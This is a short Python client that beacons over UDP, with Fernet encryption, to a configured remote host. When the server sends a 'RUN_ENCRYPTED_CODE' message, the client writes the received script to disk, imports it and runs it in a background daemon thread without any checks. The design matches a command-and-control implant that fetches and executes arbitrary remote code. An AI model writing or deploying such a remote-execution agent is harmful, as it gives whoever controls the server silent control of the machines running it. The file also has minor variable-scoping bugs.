import asyncio
import asyncudp

import threading

from cryptography.fernet import Fernet

from message import Message, MessageTypes

from utils import get_config

IP, PORT, KEY = get_config()

global COUNT
global queue

COUNT = 0
QUEUE = []

encryptor = Fernet(KEY)


def exec_msg(msg: Message):
    if msg.type == MessageTypes.RUN_ENCRYPTED_CODE:
        # print(msg.data["script"])
        # encrypted = bytes(msg.data["script"], encoding="latin-1")
        # script = fernet.decrypt(encrypted)
        script = msg.data["script"]
        with open("got_script.py", "w") as f:
            f.write(script)

        from got_script import run

        t = threading.Thread(target=run, name="name", args=())
        t.daemon = True
        t.start()


async def client(sock):
    COUNT = 0
    while True:
        if len(QUEUE) == 0:
            QUEUE.append(Message(MessageTypes.REPEAT, data={"count": COUNT}))
        await asyncio.sleep(0.1)
        if len(QUEUE) > 0:
            m_to_send = QUEUE.pop(0)
            sock.sendto(m_to_send.as_encoded(encryptor))

        received, addr = await sock.recvfrom()
        msg_received = Message.from_encoded(received, encryptor)
        print(msg_received)

        exec_msg(msg_received)

        if msg_received.type == MessageTypes.QUIT:
            break
        if msg_received.type == MessageTypes.REPEAT:
            COUNT = msg_received.data["count"]
            COUNT += 1


async def main():
    sock = await asyncudp.create_socket(remote_addr=(IP, PORT))

    await client(sock)

    sock.close()


if __name__ == "__main__":
    asyncio.run(main())
